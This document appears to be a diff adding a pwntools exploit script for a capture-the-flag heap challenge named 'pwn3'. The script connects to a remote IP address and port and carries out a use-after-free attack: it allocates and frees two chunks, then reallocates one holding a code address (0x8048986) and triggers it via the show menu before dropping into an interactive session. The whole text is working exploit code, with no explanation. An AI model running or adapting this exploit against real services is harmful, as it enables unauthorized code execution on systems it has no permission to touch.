@@ -1,0 +1,44 @@
+#!/usr/bin/python
+#coding=utf-8
+from PwnContext import *
+from IPython import embed as ipy
+
+context.terminal = ['gnome-terminal','-x','sh','-c']
+context.log_level = 'debug'
+
+s      = lambda data               :p.send(data) 
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r      = lambda numb=4096          :p.recv(numb)
+rl      = lambda                    :p.recvline()
+ru      = lambda delims,drop=False  :p.recvuntil(delims,drop)
+uu32    = lambda data               :u32(data.ljust(4, '\x00'))
+uu64    = lambda data               :u64(data.ljust(8, '\x00'))
+info    = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
+irt     = lambda                    :p.interactive()
+
+context.binary = './pwn3'
+p = remote('219.219.61.234', 10002)
+def menu(idx):
+	sla('Your choice :',str(idx))
+def add(size,payload):
+	menu(1)
+	sla('size :',str(size))
+	sa('tent :',payload)
+
+def delete(idx):
+	menu(2)
+	sla(':\n',str(idx))
+
+def show(idx):
+	menu(3)
+	sla(' :',str(idx))
+
+add(16,'aaa')
+add(16,'aaa')
+delete(0)
+delete(1)
+add(8,p32(0x8048986))
+show(0)
+irt()
